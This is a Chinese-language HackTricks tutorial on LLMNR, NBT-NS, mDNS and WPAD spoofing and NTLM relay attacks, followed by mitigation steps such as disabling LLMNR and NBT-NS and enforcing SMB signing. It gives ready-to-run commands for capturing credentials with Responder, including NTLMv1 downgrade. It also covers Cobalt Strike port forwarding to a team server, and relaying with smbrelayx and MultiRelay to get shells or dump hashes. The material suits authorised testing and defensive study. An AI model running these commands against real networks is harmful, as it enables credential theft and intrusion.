# 欺骗LLMNR、NBT-NS、mDNS/DNS和WPAD以及中继攻击

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**

</details>

## 网络协议

### LLMNR、NBT-NS和mDNS

当DNS查找失败时，Microsoft系统使用链路本地多播名称解析（LLMNR）和NetBIOS名称服务（NBT-NS）进行本地主机解析。Apple Bonjour和Linux零配置实现使用多播DNS（mDNS）在网络内发现系统。这些协议未经认证，并通过UDP广播消息；因此，攻击者可以利用它们将用户引导至恶意服务。

您可以使用Responder冒充主机搜索的服务，发送假响应。\
在此阅读更多关于[如何使用Responder冒充服务](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)的信息。

### WPAD

许多浏览器使用Web代理自动发现（WPAD）从网络加载代理设置。WPAD服务器通过特定URL（例如，_http://wpad.example.org/wpad.dat_）提供客户端代理设置，通过以下任一方式识别：

* DHCP，使用代码252条目[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* DNS，搜索本地域中的_wpad_主机名
* Microsoft LLMNR和NBT-NS（在DNS查找失败的情况下）

Responder自动化WPAD攻击—运行代理并通过DHCP、DNS、LLMNR和NBT-NS将客户端引导至恶意WPAD服务器。

## 协议投毒

### Responder - LLMNR、NBT-NS和MDNS

> Responder是LLMNR、NBT-NS和MDNS投毒器。它将根据名称后缀（参见：[http://support.microsoft.com/kb/163409](http://support.microsoft.com/kb/163409)）回应特定的NBT-NS（NetBIOS名称服务）查询。默认情况下，该工具只回应文件服务器服务请求，即SMB。
>
> 其背后的概念是针对我们的回答，并在网络上更隐蔽。这也有助于确保我们不破坏合法的NBT-NS行为。

* [**Responder**](https://github.com/lgandx/Responder) 默认安装在kali中，配置文件位于 **`/etc/responder/Responder.conf`**（在这里您可以禁用恶意服务器）
* **Responder** 将**在屏幕上打印哈希值**并将其**写入**位于 `/usr/share/responder/logs` 目录的每个主机的**日志**文件中。哈希值保存格式为 `(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt`
* 您可以在此找到适用于**windows**的Responder [这里](https://github.com/lgandx/Responder-Windows)
* Responder支持**ipv4**和**ipv6**

#### Responder 参数

Responder支持以下选项：
```
--version           show program's version number and exit
-h, --help          show this help message and exit
-A, --analyze       Analyze mode. This option allows you to see NBT-NS,
BROWSER, LLMNR requests without responding.
-I eth0, --interface=eth0
Network interface to use, you can use 'ALL' as a
wildcard for all interfaces
-i 10.0.0.21, --ip=10.0.0.21
Local IP to use (only for OSX)
-6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed
Poison all requests with another IPv6 address than
Responder's one.
-e 10.0.0.22, --externalip=10.0.0.22
Poison all requests with another IP address than
Responder's one.
-b, --basic         Return a Basic HTTP authentication. Default: NTLM
-r, --wredir        Enable answers for netbios wredir suffix queries.
Answering to wredir will likely break stuff on the
network. Default: False
-d, --DHCP          Enable answers for DHCP broadcast requests. This
option will inject a WPAD server in the DHCP response.
Default: False
-D, --DHCP-DNS      This option will inject a DNS server in the DHCP
response, otherwise a WPAD server will be added.
Default: False
-w, --wpad          Start the WPAD rogue proxy server. Default value is
False
-u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
Upstream HTTP proxy used by the rogue WPAD Proxy for
outgoing requests (format: host:port)
-F, --ForceWpadAuth Force NTLM/Basic authentication on wpad.dat file
retrieval. This may cause a login prompt. Default:
False
-P, --ProxyAuth     Force NTLM (transparently)/Basic (prompt)
authentication for the proxy. WPAD doesn't need to be
ON. This option is highly effective when combined with
-r. Default: False
--lm                Force LM hashing downgrade for Windows XP/2003 and
earlier. Default: False
--disable-ess       Force ESS downgrade. Default: False
-v, --verbose       Increase verbosity.
```
<details>

<summary>响应者参数</summary>

* `-A` 标志将我们置于**分析模式**，允许我们在环境中看到 NBT-NS、BROWSER 和 LLMNR 请求，而不会污染任何响应。
* 我们必须始终提供一个接口或 IP。
* `-wf` 将启动 WPAD 恶意代理服务器
* `-f` 将尝试识别远程主机操作系统和版本
* 使用 `-v` 标志以增加详细程度（控制台打印大量额外数据）
* 诸如 `-F` 和 `-P` 之类的选项可以用来强制 NTLM 或基本认证和强制代理认证，但可能会导致登录提示，因此应谨慎使用。
* `-w` 标志利用内置的 WPAD 代理服务器。这可以非常有效，特别是在大型组织中，因为如果浏览器启用了[自动检测设置](https://docs.microsoft.com/en-us/internet-explorer/ie11-deploy-guide/auto-detect-settings-for-ie11)，它将捕获任何启动 Internet Explorer 的用户的所有 HTTP 请求。

</details>

#### 运行响应者

要运行默认的响应者行为，你只需执行：
```bash
responder -I <Iface> #Default conf
responder -I <Iface> -P -r -v #More chances but might break things
```
一个有趣的技术是使用responder在可能的情况下降级NTLM认证。这将允许**捕获NTLMv1挑战和响应**，而不是可以**轻松破解**的NTLMv2，具体方法可以参考[**这个指南**](../../windows-hardening/ntlm/#ntlmv1-attack)**。**
```bash
#Remember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"
responder -I <Iface> --lm --disable-ess #Downgrade NTLM authntication if possible and force ESS downgrade
```
**默认情况下**，**WPAD模拟不会执行**，但你可以通过以下操作来执行它：
```bash
responder -I <Iface> --wpad
```
你也可以用**你的IP**来**解析NetBIOS**请求。并创建一个**认证代理**：
```bash
responder.py -I <interface> -Pv
```
您通常无法截获NTLM哈希值，但您可以轻松抓取一些**NTLM挑战和响应**，然后可以使用例如_**john**_的选项`--format=netntlmv2`进行**破解**。

默认_**Responder**_安装在kali中的**日志和挑战**可以在`/usr/share/responder/logs`找到。

#### Responder - DHCP投毒

Windows使用几个自定义的DHCP选项，如NetBIOS、WINS、WPAD设置。当工作站发送DHCP请求以获取其网络设置时，这些附加设置可以包含在DHCP答复中，以便简化连接和名称解析。

在不中断的情况下伪造DHCP响应可能具有挑战性，因为您正在干扰工作站的网络配置。通常，您需要非常了解目标子网，DNS服务器在哪里，交换机在哪里，路由表、域、子网掩码、DHCP服务器等在哪里。**这些设置的任何错误都会导致网络中断。**

然而，伪造DHCP答复具有独特的好处。**它绝对比ARP投毒更隐蔽**；一个单播响应就足以永久性地污染受害者的路由信息，而且在网络上运行多个DHCP服务器也是常见的。单播DHCP答复更难以检测，少数交换机提供安全设置以防止DHCP窃听，然而这些设置并不直观，当启用时经常配置错误。

> 这种攻击非常有效，并且可以确保您获得NTLMv1/2哈希值。
```bash
./Responder.py -I eth0 -Pdv
```
#### Responder - 捕获凭证

Responder 将**冒充使用上述协议的所有服务**。一旦某个用户尝试访问通过这些协议解析的服务，**他将尝试对 Responder 进行认证**，Responder 将能够**捕获**“凭证”（很可能是一个**NTLMv2 挑战/响应**）：

可以尝试降级到 NetNTLMv1 或尝试禁用 ESS。

![](<../../.gitbook/assets/poison (1) (1) (1).jpg>)

### Inveigh - C#/PowerShell Responder

> Inveigh 是一个为了帮助限制在 Windows 系统上的渗透测试人员/红队成员而设计的 PowerShell ADIDNS/LLMNR/NBNS/mDNS/DNS 欺骗和中间人工具。

[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) 最初是一个 PowerShell 脚本，现在它是一个 C# 二进制文件，具有与 Responder 相同的主要功能。有一个 [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) \*\*\*\* 列出了所有参数和使用说明。
另一个版本可以在 [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) 中找到。

![](../../.gitbook/assets/45662029-1b5e6300-bace-11e8-8180-32f8d377d48b.png)

或者使用更多选项运行它：
```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
或运行C#版本：
```bash
Inveigh.exe
```
## NTLM 中继攻击

此攻击在内部网络上中继 **SMB 认证会话** 到一个 **目标机器**。如果认证 **会话成功**，它将自动让你进入一个 **系统** **shell**。请注意，被中继的认证必须来自一个对被中继主机有本地管理员访问权限的 **用户**，并且 **SMB 签名必须被禁用**。

### 445 端口转发和隧道

{% hint style="warning" %}
如果你能够 **在网络内引入一台机器**，你可以使用下一节的任何 **工具** 来执行中继攻击，你就不需要关心这个问题。
{% endhint %}

然而，在红队中这通常不是这样，在红队中你通常需要将 **Windows机器的445端口的流量转发到你的机器** 上执行以下任何工具，然后通过代理 **将该工具的流量路由回去**，以达到攻击内部网络中的机器。

工具 [**PortBender**](https://github.com/praetorian-inc/PortBender) 是一个驱动程序，用于 **重定向** 目标为端口 **445 的流量到另一个端口**（例如 8445），我们可以绑定这个端口。它 **需要本地管理员** 权限才能加载驱动程序。使用 `cd C:\Windows\System32\drivers` 是有意义的，因为这是大多数Windows驱动程序所在的位置。
```bash
Cobalt Strike -> Script Manager -> Load (Select from the filesystem PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Go to drivers dir
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Forward traffic to 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Send traffic to port 8445 to Team Server
beacon> socks 1080 # Socks proxy in port 1080 to attack host in the internal network from the Team Server

# To kill
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Metasploit
```bash
setg Proxies socks4:127.0.0.1:1080 # Use this if you need to route the traffic to reach the attacked ip
set SRVHOST <local_ip>
set SRVPORT 445
set SMBHOST <ip_to_auth_to>
run -j
```
### smbrelayx
```bash
python3 smbrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
# By default it will just dump hashes
# To execute a command use: -c "ipconfig"
# To execute a backdoor use: -e "/path/to/backdoor

# Attack through socks proxy
proxychains python3 ntlmrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
```
### MultiRelay

如果你想使用 **MultiRelay**，请导航到 _**/usr/share/responder/tools**_ 并执行 MultiRelay (`-t <IP target> -u <User>`)：
```bash
python MultiRelay.py -t <IP target> -u ALL # If "ALL" then all users are relayed
# By default a shell is returned
python MultiRelay.py -t <IP target> -u ALL -c whoami #-c to execute command
python MultiRelay.py -t <IP target> -u ALL -d #-d to dump hashes

# Use proxychains if you need to route the traffic to reach the attacked ip
```
### 强制 NTLM 登录

在 Windows 中，您**可能能够强制某些特权账户对任意机器进行认证**。阅读以下页面以了解如何操作：

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## 解决方案

### 禁用 LLMNR

要在您的域中为 DNS 客户端禁用 LLMNR，请打开 gpedit.msc。\
导航至 计算机配置->管理模板->网络->DNS 客户端。\
找到“关闭多播名称解析”选项并点击“策略设置”：

![](../../.gitbook/assets/1.jpg)

打开新窗口后，启用此选项，点击应用并确定：

![](../../.gitbook/assets/2.jpg)

### **禁用 NBT-NS**

禁用 NBT-NS 的一个选项是使用 DHCP 范围选项。

如果使用 Microsoft 的 DHCP 服务器，选择您想要禁用 NBT-NS 的范围。右键点击“范围选项”并点击“配置选项”。在下面的示例中，我想要禁用 NBT-NS 的 DHCP 范围是 192.168.1.100。

![](../../.gitbook/assets/3.jpg)

在范围选项窗口中，导航至高级标签页，将下拉窗口更改为“Microsoft Windows 2000 选项”：

![](../../.gitbook/assets/4.jpg)

从列表中选择“001 Microsoft 禁用 Netbios 选项”，将其值更改为“0x2”，点击应用然后确定：

![](../../.gitbook/assets/5.jpg)

### WPAD

为了缓解 WPAD 攻击，您可以在您的 DNS 区域中添加一个“wpad”的条目。请注意，DNS 条目不需要指向有效的 WPAD 服务器。只要查询得到解析，攻击就会被阻止。

### 多重中继

1\. **在所有本地 Windows 机器上强制 SMB 签名**。此设置将对每个 SMB 会话进行数字签名，这迫使客户端和服务器在继续之前验证数据包的来源。此设置默认仅在域控制器上启用。以下来自 Microsoft 的文章详细介绍了这些设置（可以通过组策略启用），以及如何实施它们。

[https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/](https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/)

[https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always)

2\. **审查并确保本地网络上的用户只能远程登录到必要的机器**。例如：Sally 只能登录到 Sally 的工作站。如果攻击者截获了 Sally 的 SMB 认证会话，他们就不能将会话中继到任何工作站，使这种方法无效。

3\. **尽可能限制本地网络上的 NTLM 认证**。这种攻击无法利用 Kerberos 认证，因此通过限制发生的 NTLM 数量，可以大大阻碍这种攻击。Microsoft 提供了实现这一点的信息，但请注意.. 如果 Kerberos 认证出于任何原因失败，它通常会回退到 NTLM。如果您完全禁用它，您的网络可能会停止运行。

4\. **防止未经授权的用户进入您的网络**。内部威胁者可能不会使用 SMB 中继攻击，因为他们已经拥有网络凭据。通过加强物理安全政策，使用 ACL 和 MAC 过滤防止网络上的恶意设备，并确保适当的网络分段，您可以大大限制这种攻击被执行的威胁。

## 参考资料

* [**https://intrinium.com/smb-relay-attack-tutorial/**](https://intrinium.com/smb-relay-attack-tutorial/)
* **图片来源：**\
[https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)\
[https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)\
[https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)\
[https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> 从零开始学习 AWS 黑客攻击！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 **HackTricks** 中看到您的**公司广告**或**下载 HackTricks 的 PDF 版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs**](https://opensea.io/collection/the-peass-family) 收藏品
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧**。

</details>
